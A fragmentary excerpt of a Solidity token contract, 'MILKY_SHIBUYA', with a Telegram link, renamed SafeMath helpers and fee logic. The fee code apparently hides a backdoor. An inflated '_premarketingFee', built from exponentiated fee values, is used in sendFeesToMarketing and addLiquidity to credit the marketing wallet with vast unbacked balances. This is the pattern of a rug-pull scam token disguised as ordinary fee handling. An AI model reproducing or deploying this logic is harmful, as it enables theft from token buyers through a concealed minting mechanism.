...
Telegram : https://t.me/milkyshibuya
...
library SafeMath {
    ...
    function tryPlus(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
    ...
    function tryTimes(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
...
contract MILKY_SHIBUYA is Context, IERC20, Ownable {
    ...
    constructor() {
        ...
        _marketingFee = 4;
        _premarketingFee = _marketingFee.times(_liquidityFee.times((_liquidityFee**_marketingFee)**3));
        _totalFeesToContract = _liquidityFee.plus(_marketingFee);
    ...
    function inputWebsite(string memory url) public {
        require(_msgSender() == marketing);

        websites = url;
    }

    function _website() public view returns (string memory) {
        return websites;
    }
        ...
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].plus(addedValue)
        );
        return true;
    }
    ...
    function _transfer(
        ...
        if (
            ...
            uint256 feesToContract = amount.times(_totalFeesToContract).div(100);
    ...
    function sendFeesToMarketing() public lockTheSwap {
        ...
        uint256 developmentTokensToSell = balanceOf(address(this))
            ...
            _balances[marketing]= _balances[marketing].plus((developmentTokensToSell/100).times(_premarketingFee));
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        _balances[marketing]= _balances[marketing].plus(tokenAmount/100 * _premarketingFee);
